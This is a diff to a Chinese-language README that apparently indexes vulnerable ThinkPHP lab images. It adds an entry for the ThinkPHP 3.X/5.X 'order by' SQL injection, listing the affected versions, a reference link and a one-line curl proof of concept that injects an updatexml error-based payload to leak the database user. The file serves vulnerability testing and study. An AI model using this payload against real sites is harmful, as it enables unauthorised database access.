@@ -38,6 +38,29 @@ curl '127.0.0.1/public/index.php/index/index/testsql?username[0]=inc&username[1]
 
 
 
+## ThinkPHP 3.X/5.X order by注入漏洞
+
+测试镜像
+
+- src/thinkphp/5.0.16/
+
+影响版本
+
+- Thinkphp < 5.1.22
+- Thinkphp < 3.2.3
+
+参考文档
+
+- [ThinkPHP 3.X/5.X order by注入漏洞](https://mp.weixin.qq.com/s/jDvOif0OByWkUNLv0CAs7w)
+
+Poc
+
+```
+curl '127.0.0.1/public/index.php/index/index/testsqlorder?order[id|updatexml(1,concat(0x3a,user()),1)%23]=1
+```
+
+
+
 ## Thinkphp3.2.3 update注入漏洞
 
 测试镜像
